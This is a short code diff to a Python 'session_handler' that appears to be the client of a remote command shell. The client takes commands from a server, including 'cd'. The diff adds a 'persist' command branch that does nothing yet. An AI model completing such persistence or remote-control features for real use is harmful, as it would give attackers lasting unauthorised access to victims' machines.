@@ -40,6 +40,8 @@ def session_handler():
                 print('[!] The server has terminated the session.')
                 sock.close()
                 break
+            elif message == 'persist':
+                pass
             #Change Directory Script
             elif message.split(" ")[0] == 'cd':
                 try:
